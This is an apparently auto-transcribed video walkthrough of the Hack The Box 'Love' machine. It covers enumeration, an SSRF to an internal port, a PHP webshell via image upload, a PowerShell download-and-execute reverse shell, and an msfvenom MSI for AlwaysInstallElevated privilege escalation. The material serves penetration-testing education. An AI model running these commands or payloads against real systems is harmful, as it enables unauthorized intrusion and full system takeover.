 what's going on youtube this is ipsec i'm doing love from hack the box which was a super fun easy box that really benefits you if you do good enumeration it starts off with finding three different http ports 80 443 and 5000 5000 has a access denied and if you go to 80 or 443 it just gives you a blank voting system that has a login prompt but if you look at the ssl cert you can find there's a hidden domain i think it was staging.love.htb so you access that and then you can perform a server side request forgery to access port 5000 and get some credentials for that voting system once into the voting system there's a simple cve to execute code through image upload and then on the box you can just execute an msi to get root since this is easy i have done no preparation for this video and i try to keep them as blind as possible but when ponmio created this box he asked me to vet it and give him any suggestions and i happily did so so i've seen this box like five or six months ago but haven't looked at it since so with that being said let's jump in as always we start off with the end map but i'm doing this box live so i'm going to create the directory and then do a full port scan to scan all the ports with a dash p dash and then because i'm impatient i'm gonna do dash dash min dash rate and set it to 10 000 packets per second because i want it to go fast i want results quickly then i'll do dash v for verbose oa i'll put all formats put it in the nmap directory which i cd into so i don't have to do nmap so you just do love dash all ports and 10 10 10 239 which is the ip address of love make sure this end map runs at with sudo and it should finish i wouldn't recommend doing that min rate thing because as you can see it does generate errors you may miss ports additionally it creates a lot of traffic so you could take down a switch or something but it should finish in like 15 to 17 seconds you may be saying if it does 10 000 packets per second there's only 65 535 ports why does it take like 15 to 16 seconds and that's because um it does retries and latency on the network and things like that so it's not exactly 10 000 packets per second in terms of detection but it is pretty darn quick so looking at the ports we have 80 uh 135 139 so this is looking like a winder server once i see 445 i'm gonna look for like 3389 or something like that that would indicate a domain controller i don't see it so i don't think this is a dc we do have my sequel and that's pretty much it that's interesting winrm or one or m here i don't know what 47 0001 is but apparently it's another winner import so let's do a full script scan so we have something running while we poke at this so the first thing i'm going to do is cat the results so all ports dot nmap and then i'm just gonna grep for open and then we can do an awk dash capital f for field separator and we're gonna search for slash and grab everything before it so slash f slash and then print dollar one and then i don't know exactly how and said um i always forget when i do this on the fly to break by line breaks or search by line breaks so i'm going to take this exact thing that i did instead and do it in vi and this is just the only reason i use vi for this if i could remember the syntax i'd probably switch to just using said i'm going to do ports.list and then go into ports.list percent and then the same exact syntax and boom we have all the ports on one line so i can cat ports.list copy it and we can do old faithful of nmap so sudo and map sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory but we're cd into it already so we don't have to do that so we can just do love and then the ip address of 10 10 10 239 and then dash p for ports and specify all the ports we want so while that runs i'm going to check crack map exec real quick just because 445 is an easy check so cme smb 10 10 10 239 and we should get a header we can see this is windows 10 pro i don't know exactly what version this is i don't really pay too much attention to like 18 19 20 versions uh the name is love domain is love generally when you see the same name and domain it means it's going to be not a domain controller signing is false um if this was a domain or we had multiple boxes we may try some relaying attacks smb v1 is true we could try a tunnel blue but i don't think this version is vulnerable to it additionally uh that vulnerability is getting pretty old so it's unlikely to find that so not even gonna worry about it we're gonna try dash dash users to see if we can enumerate potential users on the box doesn't look like we can so i'm just going to go and look at http so going to 10 10 10 239 we have a page that just says voting system using php so the very first thing i try to do is identify this cms so i'm going to go to google.com and search voting system using php github and see if we have anything we have this online voting system so it goes to online voting poll so let's see is there online voting directory here voting doesn't look like there is we could try logging with admin admin and then when we do this i always like opening up my developer tools looking at networks so we can see exactly where this request goes we sent a post request to just login.php so we can look at this this application does have login.php it has an installation.text so we may want to check out that directory uh i have a space in front of it so let's get rid of that that file does not exist i'm looking for other things that are unique that i don't see often register account.php or registeracc.php that's a relatively unique name for a php file so i'm checking that and the main thing i'm doing is just trying to find out if this application is this software so just trying to do a basic fingerprint it doesn't look like it is since the two files i checked aren't there the other thing i like looking for is the site icon which is to the left here and there is none if there was like we can look at this github site icon we could download it and then go to either bing or google do a reverse image search on that and maybe find out what the application is that way but right now we're getting a big fat nothing in terms of a recon so i always like having things running in the background so let's set up our um go busters and this end map i mean when i say it may take a while i mean oh there we go it takes about three minutes so let's have a go buster then look at nmap so go buster dir u htp 101010 239 w for word list opt set list discovery web content raft small words and then because this is windows i like doing lowercase because ntfs is not case sensitive so we can look at index.php and then do random casings and it's still going to pull up the same page if this was a linux server chances are that wouldn't be the case so this just um like shrinks or a word list so it goes a bit quicker dash x for extension i'm going to do php and then dash o for out file we're just going to do go buster dash root dot text and now let's take a look at nmap so let's go into love.nmap and look at this so we have apache running there's nothing too interesting there uh 135.134.9 nothing interesting https and we have a um unique domain here staging.love.htb so we should add this into a host file so sudo slash etsy hosts and we forgot the vi so sudo vi etsy host and we can do 10 10 10 239 staging love dot htb there we go and move on so we have after that the 445 not too interesting we have my sequel and it says our host is not allowed to connect to mariadb which is my sequel so not going to do too much poking there we have port 5000 which is a another http thing and it's saying 403 forbidden 5040 i don't know then we go into this winrm stuff also linking the hostname so nothing too interesting two things i want to check is https staging.love.hdb and we can do advanced accept risk and continue and we get a forbidden here we can go to 10 10 10 239 on port 5000 and we also just get a forbidden we can try just http with staging.love.htb and we get a different web page we have this free file scanner so let's try signing up i'm going to do root and then root at ipsec dot rocks log in and we see it did a get request and looking here let's see the actual request it didn't do any parameters we could send that to burp because that is weird but it looks like this sign up today does nothing so i'm gonna do ipsec dot rocks make sure my burp suite is intercepting send it and we can see it indeed sends a blank get request so we can just completely ignore this page unless we wanted to like fuzz parameters or something but i'm going to ignore that page and we'll go to demo and we can see it says specify url so let's just try specifying itself http 101010239 and we get the page down here let's try specifying file colon slash uh we need a windows thing maybe add another windows system32 is it um let's go to google windows location of license.rtf let's see windows system32 license.rtf l-i-c-e-n-s-e dot rtf to see if we can include files and it doesn't look like we can we don't have the license.rtf file down here we can try like remote file inclusion so http 10 10 10 14.8 and then on our box we can do pseudo nc lvnp katie and http 1010 14 8 may we have to do a page i could have swore this should work let's see ip addr we are 10 10 14 8 indeed it's weird that my ton is 10 here but oh well http oh uh 10 10 14 8. i had three tens so there we go it's looking like it's taking a while and we get a request the other thing we could do is try to access other ports on this box so i'm going to send this over to wfuzz first we have to just look at the request we send a file and read parameter so we can do w fuzz dash u http 101010.238. beta.php which is this page uh we probably need to specify actually the domain name because of virtual host routing delete an extra http and then i'm going to do dash z for a unique fuzz so if we do w fuzz dash h and this is the main reason i'm using w fuzz and not fuff because i don't know how to do like a range and fluff so if i just do z range comma 1 through 65 535 it's going to create a list of that but i'm going to do 445 two four four six to start out or four four seven because we want to make sure fluff only or not fluff w5s only shows the open port so we do that and then we specify dash d for post and then the parameters so we need file is equal to http 10 10 10 127 001 colon fuzz and then we need the read is equal to scan plus file so we do this and we can see four four five all the pages 455 through 446 is identical which makes this a little bit hard to fuzz well we can look at like um if we go w fuzz advanced options maybe and we have to go to google advanced usage let's see they have a request delay and connection delay which i think should limit how long it takes for this to respond because if you look we have one immediately and then it takes like two seconds for the other request we can kind of verify that by going back to burp uh if we look at staging love let's see beta.php send this to repeater so 10 10 14 8 let's change this to 127. well we don't need all this i think zero zero one four four five we can look at this it's taking like 90 milliseconds or 100 milliseconds if we change this to 446 it's now going to take like two to three seconds because it's waiting for a connection to time out so we can take advantage of that by doing like dash dash con dash delay let's add to one and it looks like that does not work um i was hoping that 446 and 447 wouldn't show up but it looks like they do if we set condylate to to let's try the request delay that looks like it worked but if we started out at like 443 to 447 well maybe it works let's try one two sixty five thousand five hundred and thirty five come on type there we go let's see it stops and it stops after a timeout of one second so let's see let's do two i wonder if we just have to start this with a valid port so let's go back to ports.list let's do it at 80 because there's nothing below 80 that we know of uh where'd my w fuzz command go was i on that that's not going to be fun there we go so let's start this at 80 and see what happens so it just stops so i have a lot of trouble using w fuzz this way and i don't know how to do it in fluff either so what we're going to do is set this range and just fuzz for http things so i'm going to do dash dash hw for hide word and then 392. so we're going to hide everything that's not 392 words so this should just get anything that responds with a page which is good enough um if it's not a valid like http thing we probably won't get a detection here but um this is better than nothing so we're just fuzzing everything and i'm probably going to speed up the video and just wait for this to finish we see port 80 which isn't a surprise because we're just getting that voting system page but yeah i'm just going to pause the video and we'll see what this result is so um it finished but we didn't get the results we expected or i expected i only see eighty four four three and i see a process request it's under five hundred it should be like sixty five thousand we see it does a timeout and that's playing with other options to try to get this working um up here i set the con delay to an extra zero and it still did around 500 requests here i'm setting request delay equal to a high number and it looks like it may be working but it's going extremely slow so i'm going to try out fuff just to see what happens um let's do for i n sec one two six five five three five do echo i done and this will just echo all the ports so we can direct this into a file called ports and we should be able to use fluff now so f dash u htp 10 10 10 238 then dash timeout i think let's do fluff dash h actually i should just do this in a new pane so we probably want let's see we definitely want dash u we need that's cookie data so dash d is post we'll probably need to do a host header because it doesn't like sending application or content type so let's try that and i don't know why all this ports are saying open so um yeah w fuzz is just behaving weird so timeout one dash d let's just kill that we can grab this dash w word list we just do ports and see what happens that's looking good let's do v test and we'll do 70 80 443 445 446 600. so see if this works progress 6 and nothing shows up so this is probably going to be the content headers thing so i'm just going to do dash capital h and let's just grab our content type see if this works if not then i guess check the comments and see what i'm doing wrong let's see this let's not do encoding oh uh beta.php see still get six errors is there a reverse no i want to just move on and test things manually but ocd and me wants to get this correct so dash x and we can specify burp so dash x http 127.001 port 8080. so let's go to intercept on send this scan fuel that's not it but looks like it's working no route to host oh 10 10 10 239 that would be the air scan file i am glad i troubleshooted that because that would have been embarrassing to read in the comments that i had the wrong ip so dash timeout 1 still not getting anything i wonder if timeout is in milliseconds so go to proxy intercept on send let's see staging.love.htb and that's why it's always important to test and grip suite so fluff looks like it is working we only got the valid ports so now we can do w and specify ports and we should only get valid ones so this is a way to identify what i was going to say just the ssrf vulnerability hopefully i expect 139 to be showing up but it didn't so the one thing we can do is filter words for one two four eight because we don't really care about those or i'm gonna do it at the end because we may care about them um just because it's one two four eight doesn't mean um it's not serving a page it just means it didn't give us data but the port was open we can access it through localhost so something like smtp or something if it's accessible only localhost may show up like this in most cases i really wish there was like an error message that told you the ports open or an air message that would say port is closed because then we can just filter on that but this case there isn't so i'm going to just let this run and we'll see what we get so this command didn't finish but i'm not going to let it finish because if you look it's doing 19 requests per second and we have 65 000 requests to send so this would just take ages the one thing i'm really curious about is why 139 didn't show up i'm guessing it's because we connected to that port and then the port didn't send a response back because we didn't send a valid rpc message and it just hung there and waited and timed out so even this message of doing timeouts is not perfect we do get a hit on 5000 and it is not one two four eight so this is giving us an actual page now which before it gave us a access denied i'm just going to ctrl c that the other thing we could have done is went into an nmap directory and did ports.list but we'd have to re-put this to be line breaks because we made it all commas um what i mean by that is cat and matt ports.list uh we have to change those commas and put it back to new lines so not going to do that we have port 5000 that's what i wanted to see so let's go and check that board out so if we go to staging love for this page and look at 127.001 port 5000 let's see what we get it's probably going into suite we get a password dashboard if we look at this it looks like it's herman demo here but voting administration credentials and we have admin and love is in the air so we could try like ps exec or crack map exec so cme smb 10 10 10 239 dash u administrator dash p love is in the air and i'm doing single quotes because this is a special character and that would do weird things to my bash command also normally when you specify an at sign and like the very first thing you're trying to include a file i don't think that's the case for crack map exec but just have it when your special characters quote them or escape them so let's go to this voting system thing admin love is in the air do i have that correct looks like i do uh let's see was it admin so admin colon love is in the air so we're not sure exactly what these credentials are this is saying id though it's not saying user name if we go back to our go buster maybe there's going to be something else so let's cat go buster root.text and let's see let's grab v403 and we have login.php home.php i was looking for like admin.php but we have just a slash admin so let's check out slash admin and now it's saying username so let's do admin love is in the air and we get logged in so we have some header source code stir so if i search this now with voting system and of course we have to go to google first and here is the source code for this so this is the application that is running this looks very familiar this page we can check search point to see if there's any exploits out for it it's just called voting system and we have an authentication bypass i wonder if we could have used this to log in let's see this one is new to me uh search sport dash x let's see set arbitrary passwords for accounts slash online voting uh i think we need some id so let's see what is it doing first payload id is equal to one overwrite the username of the victim [Music] yeah let's just try running this what's the worst that can happen we revert the machine so v four three nine six two two eighteen so i wonder if i do python three four three python oh it's probably a python 2 application description proof of concept let's just do that and target site i wonder if online voting is a page i don't think it was but it doesn't hurt to check real quick so we can just do 10 10 10 239 and then slash then run this expect a string of bytes like object i'm guessing this is python two uh pip two let's see to three let's just try running this to see if we can quickly convert the script it was already i think python three so i'm not sure exactly what goes on here so let's not do this exploit because it's not working out of the box and i'm not positive if it is even vulnerable so let's do voting system and try a different one so we have this and let's see slash vote system that's a directory let's do that dash m again real quick overwrite it and we can change the url to slash vote system 10 10 10 239 slash vote system need to end that in a quote yeah so not sure what that exploit is so exploit dash x let's copy this one this is going to be four nine dash m to mirror okay ip address 10 10 10 239 this is admin then let's see where's lovin's in the air copy this password oh i really hate exploits that do this 10 10 14 what is our ip 8 and reverse shell ip let's do 9001 so at least it's specifying a windows server but this exploit is not really written well i just say that because i don't like all these like payload replace ip i'd rather just in the payload itself specify the ip we also have um a image upload thing so it looks like it's just uploading a image and that's all the exploit is so the one thing we should do let's grab payload on this head dash one had dash two tail dash one so i just wanted to grab this one line and we want to on base 64 this because whenever i see like base64 and some exploit code uh my radar sense goes off a spidey sense goes off and it's like what are you exactly trying to pull on me so this is a binary i think t file t i have no idea what this is strings t i thought it was going to be a binary but i don't get a mz header from this see started at 7 vh 7v that's where it started eval code so it's doing the decode then gz inflate so it's decompressing it so this is just um compressed base64 so we can probably copy this see gz inflate see let's less this file okay copy this line i guess we get a little bit of malware versing in here that was unexpected so let's see head dash two tail dash one two test.php vi test.php here paste that eval code and we can echo eval code and then i guess we gotta do php tags phptest dot php out file out ascii text see v test.php i guess i need php there and that is a pe 32 so this is a exe so if we strings out we can kind of see what it's doing this looks like it's a mature reverse shell it was compiled with mngw we got shell here it is also upx packed but yeah this is some executable so if i was on an actual engagement probably would not be running this exploit because it's just doing enough like um unsafe things where i can't validate all the code that's being ran but this is a hack the box machine and that executable is not being ran on my box so don't really care let's just run this and it doesn't look like it worked which could be annoying actually it is annoying so let's see password i don't know how i did not notice me not copy the right password i guess that went into a different clipboard let's try ctrl shift insert there we go so we ran that cat and it's not working let's see executing i wonder if defender or something is catching it call shell so s dot get call shell let's just print call shell so it should be on shell.php so let's just get this page and see what happens not found so it's doing photo show.php payload so i'm guessing maybe it's getting caught with defender we may just want to manually exploit this so let's do that let's see send payload login we can do proxy is equal to http 127.01 8080. and then send this to burp make sure we intercept if we run this let's see proxy when i specify http colon and then i'd have to do that for python why are you not going to burp let's see google.com this box is turning out to be slightly more difficult than i expected um let's see python request and then we want to uh set proxy proxy is equal to proxy let's see http that should be working http then 12701 8080. i guess we just manually do this let's go 239 we're an admin let's see voters votes i'm looking at where i can edit my profile because i'm guessing that's where a picture thing's going to be so election title total voters number of candidates nothing there let's see what is this sending it to vote url converters underscore add that exist here here we go new there we go so ipsec password and then we want to upload a file so i'm just going to before i do this let's open this image a new tab save the image and we can save it to ipsec htb love and we can save it there so this way when i add this it's going to have all the metadata of an image already so hdb love dot jpeg prep suite on save here we go so file name let's call this ip.php and instead of this jpeg data let's just do echo please subscribe like this send it over to repeater send it we got a 302 redirect to voters.php so now if i go here and what was it is it ip dot php it wrote or maybe it slash images slash ip dot php we have please subscribe so let's try shell.php here yeah not found so i'm thinking defender was removing that binary because we definitely have a way to write files so now let's go to repeater and we can do system request or is it request cmd let's just try that if we go back to here and we can say cmd equals dir there we go we have code execution so now let's try to get a shell um easiest way is probably going to be using the shang as long as defender doesn't catch this so i'm going to make dir dub dub dub and then we can go into this directory cp user share nashang then let's see shells invoke powershell tcp dot ps1 and we can do one line real quick powershell tcp oneline.ps1 and what one do we want to use let's just use the first one and we can say 10 10 14 8 9 000 1. okay let's move this to shell.ps1 python3 http server then send this to burp suite go here convert this request into a post because there's less bad characters here and oh it's been a while since i did this powershell iex new dash object net.web client download string http 1010 14 8 8 000 shell.ps1 you can put this in double quotes it's taking a while which is a good sign we get a connection back dir boom we have a reverse shell uh the one thing i'm going to do actually two things let's clear the screen let's do script shell.log and then rl wrap nclvmp 9001 and that rlwrap just gives me the up and down arrow oh oh i type dir in this window here we go awesome so i have up and down in the shell and we are on windows so the very first thing i like doing is running windpeas so let's do that uh let's do cd up privilege escalation script awesome suite and i'm just going to do a get pull to update it and then let's do win ps win ps exe then do binaries already in there cd binaries obfuscated release drawer and then probably win psx64.exe so cp this to hdb love dub dub dub and then i'm going to go into [Music] let's just do users public documents echo test temp dir we can write in here so let's do curl 10 10 14 8 8 000 win ps x64 dot exe dash o win ps.exe downloading this file and then let's execute it and hopefully it comes back maybe it'll take a while i was expecting it to like stream results out to the screen but it doesn't look like it did that so i'm just going to give this a few minutes to run and we'll see if it outputs if not we'll have to probably execute this a different way oh there we go speak of the devil so where is this let's go all the way to the top uh why is my terminal hung there we go so this is installing all updates so it looks like this has changed since i last looked at it we can see the updates were eight five so we could look at windows exploits wait what so this installed updates when today the machine doesn't have internet access i'm confused see when is this release date on this kb come on windows give me a date what the heck did i just miss the date uh oh five so i'm guessing it had pending updates and installed it when the box booted up because this is not a recent update wait yeah i was like is it going day month 414 so let's go down and just look at other things again anything that is red we have a user phoebe username system lapse is not installed lsa cache creds some av was detected windows defender we could have guessed that since it was deleting that payload see any local account can be used for lateral movement powershell history size we may want to look at this directory create landman let's see ntlm settings this gives a lot more output than it used to see i don't know what this is a new ring named pipes amsi interesting events so it's looking for a process of logging in with plain text credentials printing account process creation we must be administrator so let's see user information local users home folders so we can access phoebe's directory see win peace dll hijacking my sequel so a lot of these dll hijacking on services we'd have to be able to restart the service or reboot the box so it's not too interesting to me uh write create date files again we'd have to reboot the box to take advantage of this or also we have to be able to write to those directories so many path injections this is definitely a lot more verbose than i'm used to maybe i shouldn't run win ps without looking at the output ahead of time already see see we have some ntlm v2 hash but it's the oh it's phoebe's ntlm v2 hash so you can potentially try to crack her password not sure exactly where it got that from file permissions php cookies windows files so nothing there but i know something should be there because like i said in the intro i helped me out create this box so i probably just missed something in all this output i'm going to search my output for escalate uh probably elevate if i can spell that correctly and here we go this is what i wanted so i was hoping like this was yellow background red print but i guess the windows binary doesn't do that um because this key is definitely very bad that set it's also a msi key so i think the output probably should say msi somewhere here but we can look at it let's see if these register enabled then any privilege can install and execute msi as system so all we have to do is generate a msi file and have it do a reverse shell and we should be able to install it with our current user so let's try that going back to our session let's just go into that hdb love directory and we can try msf venom dash p for payload windows let's do uh let's just do p list i think should list all the payloads uh let's see msf venom dash l payloads is this it i always mess up the flags for this and i always hate how ruby applications take a few seconds to give the results but we can say reverse shell tcp let's see shell underscore tcp reverse underscore let's see x64 here we go we just want this reverse shell so msfvenom dash p we can send this l host is equal to 10 10 14 8 l port is equal to 9001 format is going to be msi and we can just call this payload.msi so this should be generating and we can try downloading it again so curl 10 10 14 8 8 payload.msi and then o payload.msi dir it still exists there which is a good sign nclvnp 9001 and we can do msi exact slash q slash i payload.msi and it executes we do it who am i we're anti-authority system so we can go to users administrator desktop and get the flag apologies for the sloppy cut after talking to oxdf i realized what mistake i made with this exploit script and getting it working so i want to show just typical debugging around this and spend a little bit more time here because this is definitely a valuable skill taking exploit scripts and getting it working it's not always as easy as oh it's just of image upload and we can just put a php shell and get code execution so the mistake i made is it goes to like this slash vote system slash admin and if we go to the page so 10 10 10 239 slash vote system we see it's just an image directory there's no slash admin here so this doesn't work and if we go all the way to the bottom and look at how this works we put our shell here to get the proxy but i didn't look at up here it's in an if loop and it's testing if login so the script is going to this login function which is my main mistake i didn't see this and we don't log in so it returns false and it never hits down here so we did the proxies right but it just did not execute the other thing is looking at this php thing one reason i like vim is because it makes things so easy so we can just do like set uh no wrap i think and now line wrapping is disabled so all this php thing is just on one line so we can easily see what this does so we have it calling payloads going php doing this header and then it's setting ip to double i double p i don't know why it exactly does this since it doesn't have to but that's besides the point then we have this payload this is that gzipped base64 thing that we saw before and then it's doing eval arguments and adding port and ip and then it's saving it to c colon windows temp and when it executes it we have it here it's doing path and then eval arguments so this isn't msf venom because msf venom things don't really accept arguments they hard code the ipn port in this is just a reverse shell that you call the shell and you give it the port and ip and that sends you a shell so that's what that is and it's nice to know and go through this because if this wasn't writing to sql and windows temp that gets erased every reboot i believe um you're leaving an artifact behind that you have to make sure you clean up also if you're writing detection you'd say hey they didn't see this file create so also good and i just don't like running executables that i don't have the source to on client systems so i'd definitely be changing this as i said before so let's go back here and set our hook at this login piece so if we had done this at the start and went to login and said um let's move proxy up here as well we probably should make proxy just a global by placing it outside these loops so we don't have to define it multiple times actually let's do that so let's go up here we can just go this and set the proxy that way and then go down to send payload so now we don't have to redefine it and say proxies is equal to proxy and now when i run the script it should be obvious exactly what's happening so python34945 let's go to burp suite turn proxy clear the intercept queue uh what 77. files let's see i guess i screwed something up here see payload is that it is just comma okay well script worked we do this login let's right-click and intercept the results of this or the response and we can see 404 not found and then if we ran that again it's super obvious 404 is because of this vote system thing we can take that off intercept the response and we get a 302 found and i think that's what the login is saying so v this go to login and let's see post if status code is 200 print logged in so i'm guessing it's following this going here and it gets 200 from that so request will automatically follow things so you may not like you may assume oh i got a 302 well the request library is going to follow that and then give you the end status code it does have a option to not follow request so if we do request nofollow and of course we have to go to google first let's see request probably add python and we can say nofollow and go here we just set allow redirects to false and then that would be a 302 so then we go to send payload and i'm assuming if i fix all these urls by removing this vote system then it will just magically work so let's do that okay um let's do python three four nine nc lvnp 9001 i think that's what we set the port to in this run the exploit script so it's making that request getting admin going to home here's this ad thing now we're uploading the php reverse shell sending it to 10 10 14 8 9001 forward it's getting that and we should yeah get a shell here so this is what we have and it tells us b374k shell so if again let's go to google see this is a php webshell does this do the default thing let's see doesn't look like it base i don't see any c code or executables module same thing so i don't know exactly what this web show is doing but that is the exploit and oddly it did not write to see colon windows temp it just dropped it here uh let's see sequel in windows 10 not found i think we have to be admin do i have something here i do d irc colon windows temp do we have any exes i do not so one of the things in this php thing actually broke because it didn't place it where we thought it would we can easily go to http history let's look for the post can we just easily filter this um that's only by pro let's see i can buy just sort by method and go to the bottom post to beta admin login maybe length sort by length and go to the biggest one because we're sending a entire instead of just searching for this let's just go proxy intercept and redo it so go with snapcat we can exit listen run let's see here's the login and here's the shell so it runs that then we do gz inflate temp directory so it's changing to tempter so this c h dirt actually fails um i'm not sure why i think it fails file name f open yeah because it's doing this f open here so something fails in this ch dur command again not sure what but if it didn't the web shell would not be in the current directory see what is file name default shell yeah it doesn't have any path so i wonder if we escape that that's going to be my first guess at what went wrong and then we don't get a call back let's see jr sql and windows temp so there we go now it actually uploaded to sql and windows temp but somewhere else the script aired out so that was that issue i'm not going to further troubleshoot it the one thing i think would make this code a bit easier to read let's just uh is this it oh no that's the earth bypass which i guess we could or should look at it but i'm sure there'll be a write-up somewhere online that digs into that uh see oh that's funny uh the exploit script probably needs this so um because this is double quoted we escaped the backslash and python so it only put one backslash in php and then php was treating this as an escape and that's why it failed because it was escaping w which means that backslash did nothing so in the exploit script you'd probably want put two of these or have it in single quotes because single quotes won't obey that escape but how i would do this is all these functions i would have them return some things so down here in this main i would also put like a um probably a main function here but i would do log in here so i would say um session is equal to login and then also have ip for like urls instead of doing it all hard coded and then on this we'd say um print logged in and return r.cookies i'm guessing that's it in request um let's see session is equal to this i guess we can say cookies and cookies cookies and we can also import pdb pdb.set trace to make sure cookies is what we think it is so we can do python 3 4 9 return return invalid syntax of course it is there we go turn intercept off we hit this we can look at what cookies is equal to and it's request cookies.jar send payload is one so this can be cookies then you can take this if login feature out and in here we can say cookies is equal to cookies and see if that works it may not um again i'm doing this all on the fly and that always introduces bugs so we're logging in we have this php session rdne so when we go to the next thing expect if i can type it would be great so logging in we have this cookie now and we can see our post is actually giving the right cookie so we did everything correct uh we'd have to fix up the shell exec next but i would say that and then say if cookies and then send payload and this else login failed and we have to print that but i think something like this would be easier to read um i just really hate when it's simple like this calling function and function and then having to really trace it instead of having it um right up front but that may be just me i guess maybe check the comments to see if people argue with how i would say to fix this program but that'll be it for the video take care and see you guys next week